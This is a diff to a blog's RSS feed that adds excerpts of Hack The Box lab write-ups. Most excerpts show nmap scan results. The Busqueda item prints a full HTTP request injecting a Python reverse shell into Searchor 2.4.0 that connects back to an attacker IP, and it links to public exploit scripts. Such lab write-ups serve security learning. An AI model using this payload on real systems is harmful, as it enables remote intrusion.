@@ -6,14 +6,42 @@
     <description>Recent content on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 14 Feb 2024 17:16:46 -0300</lastBuildDate>
+    <lastBuildDate>Wed, 14 Feb 2024 17:21:12 -0300</lastBuildDate>
     <atom:link href="https://sysevil.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Devvortex</title>
+      <link>https://sysevil.github.io/htb/devvortex/</link>
+      <pubDate>Wed, 14 Feb 2024 17:21:12 -0300</pubDate>
+      <guid>https://sysevil.github.io/htb/devvortex/</guid>
+      <description>#joomla IP: 10.10.11.242 OS: Linux&#xA;PortScanner nmap --min-rate 1000 -sV -sC -p- -oG fullscan 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 09:41 -03 Nmap scan report for 10.10.11.242 (10.10.11.242) Host is up (0.21s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.</description>
+    </item>
+    <item>
+      <title>Busqueda</title>
+      <link>https://sysevil.github.io/htb/busqueda/</link>
+      <pubDate>Wed, 14 Feb 2024 17:19:08 -0300</pubDate>
+      <guid>https://sysevil.github.io/htb/busqueda/</guid>
+      <description>#searcho Os: Linux | Easy ip: 10.10.11.208&#xA;Web: - Werkzeug/2.1.2 Python/3.10.6 - Flask Python - Framework ? Searchor 2.4.0&#xA;Exploits: - https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh ( searchor 2.4.0) - Exploit: https://github.com/jonnyzar/POC-Searchor-2.4.2&#xA;Reverse shell with searcho-exploit Exploit payload request: POST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 283 Origin: http://searcher.htb Connection: close Referer: http://searcher.htb/search Upgrade-Insecure-Requests: 1 engine=Amazon&amp;amp;query=&amp;#39;%20,%20exec(&amp;#34;import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#39;10.10.14.11&amp;#39;,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([&amp;#39;/bin/sh&amp;#39;,&amp;#39;-i&amp;#39;]);&amp;#34;))#&amp;amp;auto_redirect=10.10.14.11 Attacker machine Upgrade shell to TTY shell python3 -c &amp;#39;import pty; pty.</description>
+    </item>
     <item>
       <title>Builder</title>
       <link>https://sysevil.github.io/htb/builder/</link>
       <pubDate>Wed, 14 Feb 2024 17:16:46 -0300</pubDate>
       <guid>https://sysevil.github.io/htb/builder/</guid>
       <description>IP: 10.10.11.10 OS: Linux Difficult: medium&#xA;Port Scanner sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.10 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 20:17 -03 Nmap scan report for 10.10.11.10 (10.10.11.10) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Jetty 10.</description>
+    </item>
+    <item>
+      <title>Bizness</title>
+      <link>https://sysevil.github.io/htb/bizness/</link>
+      <pubDate>Wed, 14 Feb 2024 17:10:40 -0300</pubDate>
+      <guid>https://sysevil.github.io/htb/bizness/</guid>
+      <description>#obfiz IP: 10.10.11.252&#xA;Port Scan sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.252 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 18:25 -03 Warning: 10.10.11.252 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.252 (10.10.11.252) Host is up (0.13s latency). Not shown: 65290 closed tcp ports (reset), 241 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.</description>
+    </item>
+    <item>
+      <title>Steamcloud</title>
+      <link>https://sysevil.github.io/htb/steamcloud/</link>
+      <pubDate>Wed, 14 Feb 2024 16:59:48 -0300</pubDate>
+      <guid>https://sysevil.github.io/htb/steamcloud/</guid>
+      <description>Machine: Linux Difficult: Easy #Kubernetes #cloud IP: 10.10.14.149&#xA;PortScanner Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 08:33 -03 Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.13s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 2379/tcp open ssl/etcd-client? 2380/tcp open ssl/etcd-server? 8443/tcp open ssl/https-alt 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) DirScanner _|.</description>
     </item>
   </channel>
 </rss>
